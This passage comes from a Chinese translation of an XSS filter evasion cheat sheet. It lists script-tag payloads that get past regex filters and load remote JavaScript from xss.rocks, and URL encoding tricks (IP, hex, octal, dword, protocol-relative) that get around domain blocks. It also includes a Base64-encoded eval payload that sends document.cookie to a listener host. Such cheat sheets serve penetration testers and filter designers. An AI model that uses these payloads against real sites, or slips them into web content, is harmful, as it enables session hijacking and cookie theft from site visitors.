### 2.81 利用 HTML 引号包含的 XSS

注：源文章内容出现为 httx 的字符，测试改为 http，测试环境仅包括 chrome

这在 IE 中测试通过，但还得视情况而定。
它是为了绕过那些允许`<SCRIPT>`但是不允许`<SCRIPT SRC...`形式的正则过滤，即`/<script[^>]+src/i`：

(有效)

```html
<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

---

这是为了绕过那些允许 `<SCRIPT>` 但是不允许 `<SCRIPT SRC...` 形式的正则过滤，即`/<script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*)src/i`（这很重要，因为在实际环境中出现过这种正则过滤）
(无效)

```html
<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

---

另一个绕过此正则过滤`/<script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*) src/i`的 XSS：
(有效)

```html
<SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

---

又一个绕过正则过滤`/<script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*)sr c/i`的 XSS。尽管不想提及防御方法，但如果你想允许`<SCRIPT>`标签但不加载远程脚本，针对这种 XSS 只能使用状态机去防御（当然如果允许`<SCRIPT>`标签的话，还有其他方法绕过）：
(有效)

```html
<SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

---

最后一个绕过此正则过滤`/<script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\ s*)src/i`的 XSS，使用了重音符（在 Firefox 下无效）：
(无效)

```html
<SCRIPT a=`>` SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

---

这是一个 XSS 样例，用来绕过那些不会检查引号配对，而是发现任何引号就立即结束参数字符串的正则表达式：
(有效)

```html
<SCRIPT a=">'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

---

这个 XSS 很让人担心，因为如果不过滤所有活动内容几乎不可能防止此攻击：
(有效)

```html
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

### 2.82 URL 字符绕过

假定"http://www.google.com/"是不被允许的：

(应换成当前 google 对应的 ip，此处原文 ip 地址 已失效，demo 以 google 域名对应 即时 ip 及其编码为准-海秋)

#### 2.82.1. IP 代替域名(有效)

```html
<A HREF="http://66.102.7.147/">XSS</A>
```

#### 2.82.2. URL 编码(有效)

```html
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
```

#### 2.82.3. 双字节编码(未测试)

(注意：还有另一种双字节编码):

```html
<A HREF="http://1113982867/">XSS</A>
```

#### 2.82.4. 十六进制编码(有效)

每个数字的允许的范围大概是 240 位字符，就如你在第二位上看到的，并且由于十六进制 是在 0 到 F 之间，所以开头的 0 可以省略：

```html
<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
```

#### 2.82.5. 八进制编码(有效)

又一次允许填充，尽管你必须保证每类在 4 位字符以上-例如 A 类，B 类等等：

```html
<A HREF="http://0102.0146.0007.00000223/">XSS</A>
```

#### 2.82.6. Base64 编码(无效)

```html
<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">
```

#### 2.82.7. 混合编码(无效)

混合基本编码并在其中插入一些 TAB 和换行(虽然不知道浏览器为什么允许这样做)。

TAB 和换行只有被引号包含时才有效：

```html
<A HREF="h
tt p://6 6.000146.0x7.147/">XSS</A>
```

#### 2.84.8. 协议解析绕过(有效)

(// 替代 http://可以节约很多字节).当输入空间有限时很有用(少两个字符可能解决大问题) 而且可以轻松绕过类似"(ht|f)tp(s)?://"的正则过滤(感谢 Ozh 提供这部分).你也可以将"//" 换成"\\"。你需要保证斜杠在正确的位置，否则可能被当成相对路径 URL：

```html
<A HREF="//www.google.com/">XSS</A>
```

#### 2.84.9. Google 的"feeling lucky" part 1

Firefox 使用 Google 的"feeling lucky"功能根据用户输入的任何关键词来让用户跳转到其认为最可能的网站。如果你存在漏洞的页面在某些随机关键词上搜索引擎排名是第一的，你就可以利用这一特性来攻击 Firefox 用户。这使用了 Firefox 的"keyword:"协议。你可以像下面一样使用多个关键词"keyword:XSS+RSnake"。这在 Firefox2.0 后不再有效。

```html
<A HREF="//google">XSS</A>
```

#### 2.84.10. Google 的"feeling lucky" part 2

这是用了一个仅在 Firefox 上有效的小技巧，因为他实现了"feeling lucky"功能。不像下面一个例子，这个在 Opera 上无效因为 Opera 会认为这个是一个老式的 HTTP 基础认证钓鱼攻击，但它并不是。他只是一个异常的 URL，如果你点击了对话框确定，它就可以生效。但是在 Opera 上会是一个错误错误对话框，所以认为其不被 Opera 所支持，同样在 Firefox 2.0 后不再有效。

```html
<A HREF="http://ha.ckers.org@google">XSS</A>
```

#### 2.84.11. Google 的"feeling lucky" part 3

这是一个异常的 URL，只作用于 Firefox 以及 Opera，因为他们实现了"feeling lucky"功能.像上面的例子一样，他要求你的攻击页面在 Google 上特定关键词排名第一(在这个示例里关键词是"google")

```html
<A HREF="http://google:ha.ckers.org">XSS</A>
```

#### 2.84.12. 移除别名

当结合上面的 URL，移除"www."会节约 4 个字节，总共为正确设置的服务器节省 9 字节:

```html
<A HREF="http://google.com/">XSS</A>
```

#### 2.84.13. 绝对 DNS 后额外的点

```html
<A HREF="http://www.google.com./">XSS</A>
```

#### 2.84.14. JavaScript link location

```html
<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
```
